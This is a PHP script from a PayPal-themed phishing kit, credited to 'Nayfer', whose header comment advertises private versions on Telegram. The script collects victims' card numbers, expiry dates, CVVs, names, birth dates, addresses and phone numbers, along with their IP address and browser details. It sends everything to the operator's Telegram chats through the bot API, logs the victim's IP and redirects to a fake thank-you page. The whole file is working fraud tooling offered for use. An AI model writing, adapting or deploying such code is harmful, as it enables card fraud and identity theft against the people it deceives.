<?php
/*
Scama page by Nayfer
You want your private scama page ?
contact me on telegram @nayfercrax
*/
session_start();
error_reporting(0);
include "../myconfig/telegram.php";
include "../myconfig/settings.php";
$ip = getenv("REMOTE_ADDR");
$ccn = preg_replace('/\s/', '', $_POST['ccn']);
$bin = check_bin($_POST['ccn']);
 foreach($IdTelegram as $chatId) {
  $message = "[=====> 🔥🔥 PAYPAL [CRAXPRO.IO] | CARD  🔥🔥  <=====]\n\n";
  $message .= "[ 👤  Card number :      ".$_POST['ccn']."   ]\n";
  $message .= "[ 👤  Expiry date :      ".$_POST['cex']."   ]\n";
  $message .= "[ 👤  CVV :      ".$_POST['csc']."   ]\n";
  if($showbin == 1){
    $message .= "[ ====> CC - BIN <====\n";
  $message .= "[ 👤  BIN :      ".strtoupper($bin["scheme"])."   ]\n";
  $message .= "[ 👤  Type :      ".strtoupper($bin["type"])."   ]\n";
  $message .= "[ 👤  Bank :      ".strtoupper($bin["bank"]["name"])."   ]\n\n";
  }
  else{
    $message .= "\n";
  }
  $message .= "[=====> VICTIM INFROMATIONS <=====]\n\n";
  $message .= "[ 🔍 IP :    ".$ip."\n";   
  $message .= "[ 🌐 OS :    ".$user_os."\n";  
  $message .= "[ 🌐 Browser :    ".$user_browser."\n";  
  $message .= "[ 🌐 UA :    ".$_SERVER['HTTP_USER_AGENT']."\n\n"; 
  $message .= "[=====>  🔥 BY @nayfercrax 🔥  <=====]";
  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId, 
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
 }
 if($send_all_info == 1){
   foreach($IdTelegram as $chatId) {
  $message = "[=====> 🔥🔥 PAYPAL [CRAXPRO.IO] | ALL INFO  🔥🔥  <=====]\n\n";
  $message .= "[ 👤  Full Name :      ".$_SESSION['fnm']."   ]\n";
  $message .= "[ 👤  Date of birth :      ".$_SESSION['dob']."   ]\n";
  $message .= "[ 👤  Address :      ".$_SESSION['adr']."   ]\n";
  $message .= "[ 👤  City :      ".$_SESSION['cty']."   ]\n";
  $message .= "[ 👤  Zip :      ".$_SESSION['zip']."   ]\n";
  $message .= "[ 👤  State :      ".$_SESSION['stt']."   ]\n";
  $message .= "[ 👤  Country :      ".$_SESSION['cnt']."   ]\n";
  $message .= "[ 👤  Phone number :      ".$_SESSION['pnm']."   ]\n\n";
  $message .= "[ [=====>  PAYPAL [CRAXPRO.IO] | CARD  <=====]\n";
  $message .= "[ 👤  Card number :      ".$_POST['ccn']."   ]\n";
  $message .= "[ 👤  Expiry date :      ".$_POST['cex']."   ]\n";
  $message .= "[ 👤  CVV :      ".$_POST['csc']."   ]\n";
  $message .= "[ ====> CC - BIN <====\n";
  $message .= "[ 👤  BIN :      ".strtoupper($bin["scheme"])."   ]\n";
  $message .= "[ 👤  Type :      ".strtoupper($bin["type"])."   ]\n";
  $message .= "[ 👤  Bank :      ".strtoupper($bin["bank"]["name"])."   ]\n\n";
  $message .= "[=====> VICTIM INFROMATIONS <=====]\n\n";
  $message .= "[ 🔍 IP :    ".$ip."\n";   
  $message .= "[ 🌐 OS :    ".$user_os."\n";  
  $message .= "[ 🌐 Browser :    ".$user_browser."\n";  
  $message .= "[ 🌐 UA :    ".$_SERVER['HTTP_USER_AGENT']."\n\n"; 
  $message .= "[=====>  🔥 BY @nayfercrax 🔥  <=====]";
  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId, 
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
 }
 }
if($block_after_finishing == 1){
$ip_address = $_SERVER['REMOTE_ADDR'];
$file = fopen('../blocks.txt', 'a');
fwrite($file, $ip_address . "\n");
fclose($file);
}
 $randomString = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 20, 100);

?>

<script type="text/javascript">window.location = "../signin/thankyou.php?<?php echo $randomString ?>"</script>
